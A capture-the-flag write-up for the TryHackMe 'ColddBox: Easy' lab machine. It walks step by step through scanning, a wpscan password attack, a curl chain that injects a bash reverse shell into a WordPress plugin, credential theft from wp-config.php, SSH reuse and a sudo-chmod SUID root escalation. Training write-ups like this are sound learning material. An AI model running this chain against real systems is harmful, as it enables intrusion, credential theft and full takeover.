| Category          | Details                                                   |
|-------------------|-----------------------------------------------------------|
| 📝 **Name**       | [ColddBox: Easy](https://tryhackme.com/room/colddboxeasy) |  
| 🏷 **Type**       | THM Challenge                                             |
| 🖥 **OS**         | Linux                                                     |
| 🎯 **Difficulty** | Easy                                                      |
| 📁 **Tags**       | WordPress, wpscan, dictionary attack, password reuse      |

##  Task 1: boot2Root

### user.txt

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM ColddBox: Easy]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-08 15:30 +0100
Nmap scan report for 10.81.183.146
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-title: ColddBox | One more machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.28 seconds
```

#### Enumerate web server
Using web browser we can easily spot that WordPress is use and thus we should use `wpscan`, but as it did not yield any intimidate results we continue with `nikto`.
```
┌──(magicrc㉿perun)-[~/attack/THM ColddBox: Easy]
└─$ nikto -host http://$TARGET
<SNIP>
+ /hidden/: This might be interesting.
+ /xmlrpc.php: xmlrpc.php was found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-login.php: Wordpress login found.
<SNIP>
```
Other that WordPress, `/hidden/` URL has been found.

#### Access `/hidden` URL
```
┌──(magicrc㉿perun)-[~/attack/THM ColddBox: Easy]
└─$ curl http://$TARGET/hidden/                                                                                     
<!DOCTYPE html>
<html>
<head>
<meta http-equiv=”Content-Type” content=”text/html; charset=UTF-8″ />
<title>Hidden Place</title>
</head>
<body>
<div align="center">
<h1>U-R-G-E-N-T</h1>
<h2>C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip</h2>
</div>
</body>
</html>
```
This seems to be some hidden message, that could reveal names of 3 users:
- `c0ldd`
- `hugo`
- `philip`

We could confirm existence of those users with 'Lost your password' page (`http://$TARGET/wp-login.php?action=lostpassword`).

#### Prepare users list
```
┌──(magicrc㉿perun)-[~/attack/THM ColddBox: Easy]
└─$ cat <<'EOF'> users.txt
c0ldd
hugo
philip
EOF
```

#### Conduct dictionary attack against discovered users using `wpscan` and `rockyou.txt`
```
┌──(magicrc㉿perun)-[~/attack/THM ColddBox: Easy]
└─$ wpscan -U users.txt -P /usr/share/wordlists/rockyou.txt --url http://$TARGET --no-banner
<SNIP>
[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - c0ldd / 9876543210  
<SNIP>
```
After login as `c0ldd` we can see that we could modify WordPress plugins. We could use this to change code of `Hello Dolly` plugin to spawn reverse shell connection.

#### Replace `Hello Dolly` plugin with reverse shell spawner
```
curl -s -L -c cookies.txt http://$TARGET/wp-login.php -d 'log=c0ldd&pwd=9876543210&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' -o /dev/null && \
WPNONCE=$(curl -s -b cookies.txt -c cookies.txt http://$TARGET/wp-admin/plugin-editor.php?file=hello.php | grep -oP 'name="_wpnonce"\s+value="\K[^"]+') && \
PHP_CODE=$(echo "<?php system(\"/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'\"); ?>" | jq -sRr @uri) && \
curl -b cookies.txt http://$TARGET/wp-admin/plugin-editor.php -d "_wpnonce=$WPNONCE&newcontent=$PHP_CODE&action=update&file=hello.php&plugin=hello.php&scrollto=0&docs-list=&submit=Update+File"
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM ColddBox: Easy]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell
```
┌──(magicrc㉿perun)-[~/attack/THM ColddBox: Easy]
└─$ curl http://$TARGET/wp-content/plugins/hello.php
```

#### Confirm foothold gained
```
connect to [192.168.131.53] from (UNKNOWN) [10.82.159.60] 33962
bash: cannot set terminal process group (1309): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ColddBox-Easy:/var/www/html/wp-content/plugins$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Discover user with shell access
```
www-data@ColddBox-Easy:/var/www/html/wp-content/plugins$ cat /etc/passwd
<SNIP>
c0ldd:x:1000:1000:c0ldd,,,:/home/c0ldd:/bin/bash
<SNIP>
```

#### Discover MySQL credentials for user `c0ldd` in WordPress configuration
```
www-data@ColddBox-Easy:/var/www/html/wp-content/plugins$ cat /var/www/html/wp-config.php
</www/html/wp-content/plugins$ cat /var/www/html/wp-config.php               
<SNIP>
/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');
<SNIP>
```

#### Reuse discovered credentials to access target over SSH
```
┌──(magicrc㉿perun)-[~/attack/THM ColddBox: Easy]
└─$ ssh c0ldd@$TARGET -p 4512
** WARNING: connection is not using a post-quantum key exchange algorithm.
<SNIP>
c0ldd@ColddBox-Easy:~$ id
uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

#### Capture user flag
```
c0ldd@ColddBox-Easy:~$ cat /home/c0ldd/user.txt 
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

### root.txt

#### List allowed sudo commands
```
c0ldd@ColddBox-Easy:~$ sudo -l
[sudo] password for c0ldd: 
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

#### Use `chmod` to add SUID flag to `/bin/bash` and spawn root shell
```
c0ldd@ColddBox-Easy:~$ sudo /bin/chmod +s /bin/bash && /bin/bash -p
bash-4.3# id
uid=1000(c0ldd) gid=1000(c0ldd) euid=0(root) egid=0(root) grupos=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(c0ldd)
```

#### Capture root flag
```
bash-4.3# cat /root/root.txt 
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```
